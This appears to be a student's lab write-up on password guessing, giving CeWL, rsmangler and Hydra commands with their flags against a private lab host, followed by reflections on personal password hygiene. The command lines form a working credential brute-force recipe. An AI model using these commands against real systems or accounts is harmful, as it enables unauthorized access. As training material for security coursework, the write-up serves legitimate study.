# Lab 5-1: Password Guessing

## Using CEWL

1. `cewl -d 1 http://10.0.5.21/bios/frodo -w frodo.txt`
2. -d: depth
3. -w: wordlist

## Using rsmangler with parameters

1. `rsmangler --file samwise.small.txt -x 12 -m 9  -l -s -e -i -p -u  -a --output samwise.mangled.txt`
2. -x: maximum length
3. -m: minimum length
4. -l: lowercase
5. -s: swap case
6. -e: add "ed" to end of word
7. -i: add "ing" to end of word
8. -p: permutate
9. -u: uppercase
10. -a: create acronym
> Note: Rsmangler options limit possible outputs

## Using Hydra

1. For http: `hydra -l pippin -P pippin.mangled.txt -s 80 -f 10.0.5.21 http-get /admin/`
2. -l: username
3. -P: wordlist
4. -s: port
5. -f: exit after success
6. `http-get` specifies protocol
7. `/admin/` denotes target

## Issues

An issue I encountered was that I was unable to connect to any machines over ssh when starting this lab. I realized this is because I restarted my Kali box, and wireguard needed to be turned back on.

## Reflection
### Are your own passwords guessable?

  Some of my older passwords are guessable, but many are not.
  
### Are they repeated over multiple systems and services?

  For simplicities sake, I occasionally reuse passwords on services that I am not concerned about.

### Are they included in lists such as rockyou?

  Some of my passwords are included in wordlists, but these are tied to accounts that prevent low impact to me should they be used against me.

### How can you improve your password tradecraft?
 
  Heavier use of a password manager would not only make my passwords more secure, it would also make my life much simpler
  
### What are you doing right?

  More often than not I use a password manager to create unique randomized passwords for many of my accounts. This is protected by one master passwword, which I have never stored digitally.
